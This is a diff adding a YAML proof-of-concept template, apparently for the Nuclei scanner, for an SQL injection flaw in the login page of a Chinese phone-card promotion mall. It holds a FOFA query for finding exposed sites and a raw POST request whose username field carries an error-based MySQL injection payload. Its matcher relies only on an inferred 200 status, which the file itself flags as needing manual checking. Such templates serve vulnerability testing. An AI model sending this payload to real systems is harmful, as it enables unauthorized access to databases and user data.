@@ -1,0 +1,40 @@
+id: poc-590da5c31eec91963600
+info:
+  name: 手机卡号推广商城ssk存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/590da5c31eec919636008ddd7ebbc45f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 590da5c31eec919636008ddd7ebbc45f
+    fofa: + fofa`body="zgdx.php"`
+http:
+- raw:
+  - 'POST /ssk/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 199
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cache-Control: max-age=0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+
+    username='' OR (SELECT 5126 FROM(SELECT COUNT(*),CONCAT(0x716a6a6a71,(SELECT (ELT(5126=5126,1))),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Tyft&password=123123'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
